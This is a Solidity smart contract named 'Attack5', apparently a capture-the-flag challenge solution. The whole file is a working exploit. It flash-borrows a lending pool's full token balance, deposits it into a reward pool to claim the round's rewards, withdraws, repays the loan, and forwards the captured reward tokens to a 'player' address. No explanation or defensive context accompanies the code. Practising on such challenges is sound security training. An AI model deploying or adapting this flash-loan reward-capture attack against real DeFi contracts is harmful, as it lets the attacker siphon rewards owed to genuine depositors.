// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewardPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);

    function isNewRewardsRound() external view returns (bool);
}

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

contract Attack5 {
    IFlashLoanPool private immutable flashLoanPool;
    IRewardPool private immutable rewardPool;
    IERC20 public immutable liquidityToken;
    IERC20 public immutable rewardToken;
    address private immutable player;

    constructor(
        address _flashLoanPool,
        address _rewardPool,
        address _liquidityToken,
        address _rewardToken,
        address _player
    ) {
        flashLoanPool = IFlashLoanPool(_flashLoanPool);
        rewardPool = IRewardPool(_rewardPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        player = _player;
    }

    function attack() external {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amount);

        // Withdraw rewards
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(player, rewards);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve and Deposit
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        // Withdraw and Repay loan
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
